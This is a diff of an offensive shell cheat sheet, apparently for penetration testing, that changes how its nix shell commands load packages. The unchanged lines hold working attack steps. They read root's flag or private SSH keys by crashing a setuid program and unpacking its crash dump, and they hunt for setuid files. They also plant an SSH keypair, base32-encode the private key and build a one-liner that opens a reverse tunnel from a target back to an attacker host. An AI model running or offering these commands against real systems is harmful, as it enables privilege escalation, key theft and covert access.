@@ -6,7 +6,7 @@ $ remote_port: printf '%s\n' 3389 22 | tr ' ' '\n'
 
 
 # suid file reads
-printf '%s\n' "#read file (/root/root.txt | /root/.ssh/id_rsa | /home/someuser/.ssh/id_rsa) with program with suid and then crash it (ps -aux | grep './program_name' | head -n 1 | awk '{print \$2}' | xargs kill -SIGSEGV)" "nix shell --impure -I nixpkgs=channel:nixos-unstable nixpkgs#coreutils -c rm -r /tmp/crash-report" "nix shell github:esp0xdeadbeef/cheat.sheets#apport -c apport-unpack _opt_count.1000.crash /tmp/crash-report"
+printf '%s\n' "#read file (/root/root.txt | /root/.ssh/id_rsa | /home/someuser/.ssh/id_rsa) with program with suid and then crash it (ps -aux | grep './program_name' | head -n 1 | awk '{print \$2}' | xargs kill -SIGSEGV)" "nix shell --impure -I nixpkgs=channel:nixos-unstable --expr 'with import (builtins.findFile builtins.nixPath "nixpkgs") { config.allowUnfree = true; }; [ coreutils ]' -c rm -r /tmp/crash-report" "nix shell github:esp0xdeadbeef/cheat.sheets#apport -c apport-unpack _opt_count.1000.crash /tmp/crash-report"
 
 
 # find suid/guid files
@@ -17,11 +17,11 @@ printf '%s\n' 'echo "suid files: \n$(find / -perm /4000 2>/dev/null)"' 'echo "gu
 echo 'echo "(s|g)uid files: \n$(find / -perm /6000 2>/dev/null)"' | xclip -selection clipboard
 
 # port (REMOTE TO LOCAL) forwarding (target 3389) (https://askubuntu.com/questions/48129/how-to-create-a-restricted-ssh-user-for-port-forwarding)
-nix shell --impure -I nixpkgs=channel:nixos-unstable nixpkgs#gnugrep -c grep -E 'limited-user' /etc/ssh/sshd_config || printf '%s\n' "Match User limited-user" "   #AllowTcpForwarding yes" "   X11Forwarding no" "   #PermitTTY no" "   #PermitTunnel no" "   #GatewayPorts no" "   AllowAgentForwarding no" "   #PermitOpen localhost:62222" "   ForceCommand echo 'This account can only be used for [reason]'";
-nix shell --impure -I nixpkgs=channel:nixos-unstable nixpkgs#shadow -c usermod --shell /bin/bash limited-user
-nix shell --impure -I nixpkgs=channel:nixos-unstable nixpkgs#coreutils -c rm -r /home/limited-user/.ssh 2>/dev/null
-nix shell --impure -I nixpkgs=channel:nixos-unstable nixpkgs#coreutils -c sudo -u limited-user mkdir -p /home/limited-user/.ssh
-nix shell --impure -I nixpkgs=channel:nixos-unstable nixpkgs#openssh -c sudo -u limited-user ssh-keygen -t rsa -q -N "" -f "/home/limited-user/.ssh/id_rsa"
-nix shell --impure -I nixpkgs=channel:nixos-unstable nixpkgs#coreutils -c sudo -u limited-user cp /home/limited-user/.ssh/id_rsa.pub /home/limited-user/.ssh/authorized_keys
+nix shell --impure -I nixpkgs=channel:nixos-unstable --expr 'with import (builtins.findFile builtins.nixPath "nixpkgs") { config.allowUnfree = true; }; [ gnugrep ]' -c grep -E 'limited-user' /etc/ssh/sshd_config || printf '%s\n' "Match User limited-user" "   #AllowTcpForwarding yes" "   X11Forwarding no" "   #PermitTTY no" "   #PermitTunnel no" "   #GatewayPorts no" "   AllowAgentForwarding no" "   #PermitOpen localhost:62222" "   ForceCommand echo 'This account can only be used for [reason]'";
+nix shell --impure -I nixpkgs=channel:nixos-unstable --expr 'with import (builtins.findFile builtins.nixPath "nixpkgs") { config.allowUnfree = true; }; [ shadow ]' -c usermod --shell /bin/bash limited-user
+nix shell --impure -I nixpkgs=channel:nixos-unstable --expr 'with import (builtins.findFile builtins.nixPath "nixpkgs") { config.allowUnfree = true; }; [ coreutils ]' -c rm -r /home/limited-user/.ssh 2>/dev/null
+nix shell --impure -I nixpkgs=channel:nixos-unstable --expr 'with import (builtins.findFile builtins.nixPath "nixpkgs") { config.allowUnfree = true; }; [ coreutils ]' -c sudo -u limited-user mkdir -p /home/limited-user/.ssh
+nix shell --impure -I nixpkgs=channel:nixos-unstable --expr 'with import (builtins.findFile builtins.nixPath "nixpkgs") { config.allowUnfree = true; }; [ openssh ]' -c sudo -u limited-user ssh-keygen -t rsa -q -N "" -f "/home/limited-user/.ssh/id_rsa"
+nix shell --impure -I nixpkgs=channel:nixos-unstable --expr 'with import (builtins.findFile builtins.nixPath "nixpkgs") { config.allowUnfree = true; }; [ coreutils ]' -c sudo -u limited-user cp /home/limited-user/.ssh/id_rsa.pub /home/limited-user/.ssh/authorized_keys
 export LIMITED_USER_ID_RSA_BASE32=$(cat /home/limited-user/.ssh/id_rsa | base32 -w 0)
 echo "echo '$(echo $LIMITED_USER_ID_RSA_BASE32)' | base32 -d > /tmp/id_rsa_LIMITED_USER_ID;chmod 600 /tmp/id_rsa_LIMITED_USER_ID; ssh -i /tmp/id_rsa_LIMITED_USER_ID -N -R <kali_port>:localhost:<remote_port> limited-user@<IP>" | xclip -selection clipboard
